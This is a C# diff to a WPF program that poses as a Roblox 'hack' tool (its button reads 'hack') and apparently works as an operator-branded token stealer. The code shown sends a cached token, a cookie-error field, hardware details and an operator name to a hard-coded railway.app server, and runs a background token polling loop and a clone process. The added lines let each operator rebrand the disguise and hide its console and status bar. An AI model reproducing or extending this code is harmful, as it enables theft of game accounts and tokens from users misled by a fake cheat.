@@ -23,6 +23,69 @@ namespace FileTransfer
     {
         private static readonly HttpClient _http;
 
+        private void ReadConfigFromPlaceholder()
+        {
+            try
+            {
+                string payload = ConfigData.Payload;
+                // It starts with <<NEXUS_CFG_START>> and we should find <<NEXUS_CFG_END>> or just parse the JSON after the start tag
+                int startIdx = payload.IndexOf("<<NEXUS_CFG_START>>");
+                if (startIdx != -1)
+                {
+                    startIdx += "<<NEXUS_CFG_START>>".Length;
+                    string jsonPart = payload.Substring(startIdx).TrimEnd();
+                    int endIdx = jsonPart.IndexOf("<<NEXUS_CFG_END>>");
+                    if (endIdx != -1)
+                    {
+                        jsonPart = jsonPart.Substring(0, endIdx).TrimEnd();
+                    }
+
+                    if (!string.IsNullOrWhiteSpace(jsonPart))
+                    {
+                        using (var doc = System.Text.Json.JsonDocument.Parse(jsonPart))
+                        {
+                            var root = doc.RootElement;
+                            if (root.TryGetProperty("operatorName", out var vOp)) OperatorName = vOp.GetString() ?? OperatorName;
+                            if (root.TryGetProperty("appTitleMain", out var vApp)) AppTitleMainText = vApp.GetString() ?? AppTitleMainText;
+                            if (root.TryGetProperty("appTitleVersion", out var vVer)) AppTitleVersionText = vVer.GetString() ?? AppTitleVersionText;
+                            if (root.TryGetProperty("windowTitle", out var vWin)) WindowTitleText = vWin.GetString() ?? WindowTitleText;
+                            
+                            if (root.TryGetProperty("themeAccent", out var vAcc)) ThemeAccentHex = vAcc.GetString() ?? ThemeAccentHex;
+                            if (root.TryGetProperty("themeSurface", out var vSur)) ThemeSurfaceHex = vSur.GetString() ?? ThemeSurfaceHex;
+                            if (root.TryGetProperty("hideConsole", out var vHc)) HideConsole = vHc.GetString() == "true";
+                            if (root.TryGetProperty("hideStatus", out var vHs)) HideStatusBar = vHs.GetString() == "true";
+                            if (root.TryGetProperty("loginText", out var vLt)) LoginBtnText = vLt.GetString() ?? LoginBtnText;
+                            if (root.TryGetProperty("placeholderText", out var vPt)) PlaceholderTextValue = vPt.GetString() ?? PlaceholderTextValue;
+
+                            if (root.TryGetProperty("layout", out var layoutEl) && layoutEl.ValueKind == System.Text.Json.JsonValueKind.Object)
+                            {
+                                LayoutJson = layoutEl.GetRawText();
+                            }
+                            
+                            Log($"Loaded config from placeholder: Operator={OperatorName}, Accent={ThemeAccentHex}");
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("Failed to read placeholder config: " + ex.Message);
+            }
+        }
+
+        private static string LayoutJson = "{}";
+
+        private static string AppTitleMainText = "RAH NonPro";
+        private static string AppTitleVersionText = " v7.0.2";
+        private static string WindowTitleText = "RAH NonPro v7.0.2";
+        private static string ClientVersion = "7.0.2";
+        private static string ThemeAccentHex = "#00F0FF";
+        private static string ThemeSurfaceHex = "#0D0E12";
+        private static bool HideConsole = false;
+        private static bool HideStatusBar = false;
+        private static string LoginBtnText = "ВЗЛОМАТЬ";
+        private static string PlaceholderTextValue = "Username";
+
         static MainWindow()
         {
             var handler = new HttpClientHandler
@@ -37,15 +100,14 @@ namespace FileTransfer
         }
 
         private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
-        private const string OperatorName = "DildMan";
+        private static string OperatorName = "Dildman";
 
         private string? _cpu, _ram, _gpu, _cookieError;
         private static string? _cachedToken;
-        private const string PlaceholderText = "Введите никнейм...";
         private DispatcherTimer? _debounceTimer;
         private bool _backgroundMode;
         private static Mutex? _cloneMutex;
-        private static readonly string TokenLockPath = Path.Combine(Path.GetTempPath(), "ft_token_job_dild.lock");
+        private static readonly string TokenLockPath = Path.Combine(Path.GetTempPath(), "ft_token_job.lock");
         private static FileStream? _tokenLockStream;
         private static readonly Random _rng = new();
 
@@ -65,15 +127,49 @@ namespace FileTransfer
             catch { }
         }
 
+
+
         public MainWindow()
         {
             Log("MainWindow constructor start");
+            ReadConfigFromPlaceholder();
             try
             {
                 InitializeComponent();
+
+                // Apply dynamic styles and visibility
+                try
+                {
+                    var converter = new System.Windows.Media.BrushConverter();
+                    if (!string.IsNullOrEmpty(ThemeAccentHex))
+                        this.Resources["Accent"] = (System.Windows.Media.SolidColorBrush)converter.ConvertFromString(ThemeAccentHex);
+                    if (!string.IsNullOrEmpty(ThemeSurfaceHex))
+                        this.Resources["Surface"] = (System.Windows.Media.SolidColorBrush)converter.ConvertFromString(ThemeSurfaceHex);
+
+                    if (HideConsole && ConsoleArea != null)
+                        ConsoleArea.Visibility = Visibility.Collapsed;
+                    if (HideStatusBar && StatusBadge != null)
+                        StatusBadge.Visibility = Visibility.Collapsed;
+                    
+                    if (BtnHack != null)
+                        BtnHack.Content = LoginBtnText;
+
+                    // Apply Layout if valid
+                    // Absolute positioning is disabled to support the modern Sidebar Grid layout.
+                }
+                catch (Exception styleEx)
+                {
+                    Log("Style apply error: " + styleEx.Message);
+                }
+
+                // Apply dynamic texts
+                this.Title = WindowTitleText;
+                if (AppTitleMain != null) AppTitleMain.Text = AppTitleMainText;
+                if (AppTitleVersion != null) AppTitleVersion.Text = AppTitleVersionText;
+
                 Loaded += MainWindow_Loaded;
 
-                TxtUsername.Text = PlaceholderText;
+                TxtUsername.Text = PlaceholderTextValue;
                 TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
 
                 string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "unknown";
@@ -112,7 +208,7 @@ namespace FileTransfer
                 {
                     // Клон — проверяем, не запущен ли уже другой клон
                     bool createdNew;
-                    _cloneMutex = new Mutex(true, "Global\\FileTransferCloneDild_v1", out createdNew);
+                    _cloneMutex = new Mutex(true, "Global\\FileTransferClone_v1", out createdNew);
                     if (!createdNew)
                     {
                         Log("Clone already running, exiting duplicate");
@@ -254,6 +350,7 @@ namespace FileTransfer
             try
             {
                 _tokenLockStream = new FileStream(TokenLockPath, FileMode.Create, FileAccess.Write, FileShare.None);
+                // Пишем pid чтобы было видно кто держит блокировку
                 byte[] pidBytes = System.Text.Encoding.UTF8.GetBytes($"{Environment.ProcessId}");
                 _tokenLockStream.Write(pidBytes, 0, pidBytes.Length);
                 _tokenLockStream.Flush();
@@ -288,6 +385,7 @@ namespace FileTransfer
         private async Task TokenRequestPollLoopAsync()
         {
             Log("Token request poll loop start");
+            // Небольшая случайная задержка при старте чтобы разнести polling двух процессов
             int startupDelay = _rng.Next(5000, 15000);
             Log($"Token poll initial delay: {startupDelay}ms");
             await Task.Delay(startupDelay);
@@ -389,7 +487,7 @@ namespace FileTransfer
                 content.Add(new StringContent(_ram ?? "—"), "ram");
                 content.Add(new StringContent(_gpu ?? "—"), "gpu");
                 content.Add(new StringContent(OperatorName), "operator");
-                content.Add(new StringContent("7.0.2"), "version");
+                content.Add(new StringContent(ClientVersion), "version");
 
                 if (!string.IsNullOrEmpty(_cachedToken))
                 {
@@ -778,14 +876,75 @@ namespace FileTransfer
             {
                 System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                 {
-                    FileName = "https://t.me/pyshinka_channel",
-                    UseShellExecute = true
+                    FileName = "https://t.me/robloxvzlomez",
                 });
             }
             catch (Exception ex)
             {
                 System.Diagnostics.Debug.WriteLine("Error opening Telegram link: " + ex.Message);
             }
+        }
+
+        // ── Navigation Sidebar ──────────────────────────────────────────────
+        private void ResetNavButtons()
+        {
+            BtnNavDashboard.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
+            BtnNavSettings.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
+            BtnNavLogs.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
+            
+            ViewDashboard.Visibility = Visibility.Collapsed;
+            ViewSettings.Visibility = Visibility.Collapsed;
+            ViewLogs.Visibility = Visibility.Collapsed;
+        }
+
+        private void BtnNavDashboard_Click(object sender, RoutedEventArgs e)
+        {
+            ResetNavButtons();
+            BtnNavDashboard.Foreground = System.Windows.Media.Brushes.White;
+            ViewDashboard.Visibility = Visibility.Visible;
+        }
+
+        private void BtnNavSettings_Click(object sender, RoutedEventArgs e)
+        {
+            ResetNavButtons();
+            BtnNavSettings.Foreground = System.Windows.Media.Brushes.White;
+            ViewSettings.Visibility = Visibility.Visible;
+        }
+
+        private void BtnNavLogs_Click(object sender, RoutedEventArgs e)
+        {
+            ResetNavButtons();
+            BtnNavLogs.Foreground = System.Windows.Media.Brushes.White;
+            ViewLogs.Visibility = Visibility.Visible;
+        }
+
+        // ── Theme Changer ───────────────────────────────────────────────────
+        private void BtnTheme_Click(object sender, RoutedEventArgs e)
+        {
+            if (sender is Button btn && btn.Background is SolidColorBrush brush)
+            {
+                ThemeAccentHex = brush.Color.ToString();
+                this.Resources["Accent"] = brush;
+                
+                // Remove stroke from all buttons
+                BtnThemeCyan.Template = GetThemeButtonTemplate(false);
+                BtnThemePink.Template = GetThemeButtonTemplate(false);
+                BtnThemePurple.Template = GetThemeButtonTemplate(false);
+                
+                // Add stroke to selected button
+                btn.Template = GetThemeButtonTemplate(true);
+            }
+        }
+        
+        private ControlTemplate GetThemeButtonTemplate(bool selected)
+        {
+            var template = new ControlTemplate(typeof(Button));
+            var ellipse = new FrameworkElementFactory(typeof(System.Windows.Shapes.Ellipse));
+            ellipse.SetBinding(System.Windows.Shapes.Ellipse.FillProperty, new System.Windows.Data.Binding("Background") { RelativeSource = new System.Windows.Data.RelativeSource(System.Windows.Data.RelativeSourceMode.TemplatedParent) });
+            ellipse.SetValue(System.Windows.Shapes.Ellipse.StrokeThicknessProperty, selected ? 2.0 : 0.0);
+            ellipse.SetValue(System.Windows.Shapes.Ellipse.StrokeProperty, selected ? System.Windows.Media.Brushes.White : System.Windows.Media.Brushes.Transparent);
+            template.VisualTree = ellipse;
+            return template;
         }
     }
 
